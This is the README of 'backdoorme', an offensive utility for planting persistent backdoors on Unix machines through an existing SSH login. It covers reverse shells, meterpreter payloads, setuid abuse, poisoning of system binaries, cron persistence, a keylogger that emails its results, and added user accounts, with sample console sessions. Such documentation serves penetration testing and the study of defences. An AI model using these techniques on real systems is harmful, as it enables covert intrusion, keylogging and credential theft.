# backdoorme [![Build Status](https://travis-ci.org/Kkevsterrr/backdoorme.png)](https://travis-ci.org/Kkevsterrr/backdoorme)

 Backdoorme is a powerful utility capable of backdooring Unix machines with a slew of backdoors.  Backdoorme uses a familiar metasploit interface with tremendous extensibility. 
 
 Backdoorme relies on having an existing SSH connection or credentials to the victim, through which it will transfer and deploy any backdoors.  In the future, this reliance will be removed as the tool is expanded. 
 To set up SSH, please see here: https://help.ubuntu.com/community/SSH/OpenSSH/Configuring
 
 Please only use Backdoorme with explicit permission - please don't hack without asking.  
## Usage
Backdoorme comes with a number of built-in backdoors, modules, and auxiliary modules.  Backdoors are specific components to create and deploy a specific backdoor, such as a netcat backdoor or msfvenom backdoor.  Modules can be applied to any backdoor, and are used to make backdoors more potent, stealthy, or more readily tripped. Auxiliaries are useful operations that could be performed to help persistence.

To start backdoorme, first ensure that you have the required dependencies. 
```python
$ python dependencies.py
```
Launching backdoorme:
```
$ python master.py
   ___           __      __              __  ___
  / _ )___ _____/ /_____/ /__  ___  ____/  |/  /__
 / _  / _ `/ __/  '_/ _  / _ \/ _ \/ __/ /|_/ / -_)
/____/\_,_/\__/_/\_\\_,_/\___/\___/_/ /_/  /_/\__/
Welcome to BackdoorMe, a powerful backdooring utility. Type "help" to see the list of available commands.
Type "addtarget" to set a target, and "open" to open an SSH connection to that target.
Using local IP of 10.1.0.1.
>>
```
To add a target:
``` 
>> addtarget
Target Hostname: 10.1.0.2
Username: victim
Password: password123
 + Target 1 Set!
>>
```
### Backdoors

To use a backdoor, simply run the "use" keyword. 
``` 
>> use metasploit
 + Using current target 1.
 + Using Metasploit backdoor...
(msf) >>
```
From there, you can set options pertinent to the backdoor.  Run either "show options" or "help" to see a list of parameters that can be configured.  To set an option, simply use the "set" keyword. 
```
(msf) >> show options
Backdoor options:

Option		Value		Description		Required
------		-----		-----------		--------
name		initd		name of the backdoor		False
format		elf		format to write the backdoor to		True
lhost		10.1.0.1		local IP to connect back to		True
encoder		none		encoder to use for the backdoor		False
lport		4444		local port to connect back on		True
payload		linux/x86/meterpreter/reverse_tcp		payload to deploy in backdoor		True
(msf) >> set name apache
 + name => apache
(msf) >> show options
Backdoor options:

Option		Value		Description		Required
------		-----		-----------		--------
name		apache		name of the backdoor		False
...
```
Currently enabled backdoors include:
 
 - Bash
  - Uses a simple bash script to connect to a specific ip and port combination and pipe the output into bash.
 - Bash2 (more reliable)
  - A slightly different version of the above bash backdoor which does not prompt for the password on the client-side.
 - Metasploit
  - Employs msfvenom to create a reverse_tcp binary on the target, then runs the binary to connect to a meterpreter shell.
 - Netcat
  - Uses netcat to pipe standard input and output to /bin/sh, giving the user an interactive shell.
 - Netcat-traditional
  - Utilizes netcat-traditional's -e option to create a reverse shell.
 - Perl
  - A script written in perl which redirects output to bash, and renames the process to look less conspicuous.
 - Php (does not automatically install a web server, but use the web module!)
  - Runs a php backdoor which sends output to bash.
 - Pupy
  - Uses n1nj4sec's Pupy backdoor, found at https://github.com/n1nj4sec/pupy.
 - Python
  - Uses a short python script to perform commands and send output back to the user.
 - SetUID
  - The SetUID backdoor works by setting the setuid bit on a binary while the user has root acccess, so that when that binary is later run by a user without root access, the binary is executed with root access. By default, this backdoor flips the setuid bit on nano, so that if root access is ever lost, the attacker can SSH back in as an unpriviledged user and still be able to run nano (or any chosen binary) as root. ('nano /etc/shadow'). 
 - SSH Key
  - Creates RSA key and copies to target for a passwordless ssh connection
 - Web (php - not the same backdoor as the above php backdoor)
  - Ships a web server to the target, then uploads msfvenom's php reverse_tcp backdoor and connects to the host.
 
### Modules
Every backdoor has the ability to have additional modules applied to it to make the backdoor more potent. To add a module, simply use the "add" keyword. 
```
(msf) >> add poison
 + Poison module added
```
Each module has additional parameters that can be customized, and if "help" is rerun, you can see or set any additional options. 
```
(msf) >> help
...
Poison module options:

Option		Value		Description		Required
------		-----		-----------		--------
name	    ls		  name of command to poison		False
location /bin		where to put poisoned files into		False
```
Currently enabled modules include:
 - Poison
  - Performs bin poisoning on the target computer - it compiles an executable to call a system utility and an existing backdoor.
  - For example, if the bin poisoning module is triggered with "ls", it would would compile and move a binary called "ls" that would run both an existing backdoor and the original "ls", thereby tripping a user to run an existing backdoor more frequently. 
 - Cron
  - Adds an existing backdoor to the root user's crontab to run with a given frequency.  
 - Web
  - Sets up a web server and places a web page which triggers the backdoor.
  - Simply visit the site with your listener open and the backdoor will begin.
 - Keylogger
  - Ships a keylogger to the target and starts it.
  - Given the option to email the results to you every hour.
 - User
  - Adds a new user to the target.
 - Startup
  - Allows for backdoors to be spawned with the bashrc and init files.

### Auxiliaries
In order to have persistence be more potent, some users may wish to install certain services on a target. To apply an auxiliary module, use the "apply" keyword.

```
>> apply user
+ User Auxiliary Module added.
```

Auxiliaries also support the use of modules, so they can be triggered more steathily or more often.

```
>> (user) add startup
+ Startup Module added.
```

Currently enabled auxiliaries include:

- User
 - Adds a new user to the target.
- Web
 - Installs an Apache Server on the client.
- SimpleHTTP
 - Installs python's SimpleHTTP server on the client.

### Targets
Backdoorme supports multiple different targets concurrently, organized by number when entered. The core maintains one "current" target, to which any new backdoors will default. To switch targets manually, simply add the target number after the command: "use metasploit 2" will prepare the metasploit backdoor against the second target.

## Contributing
Backdoorme is still very much in its infancy! Feel free to contribute to the project - simply fork it, make your changes, and issue a pull request. 
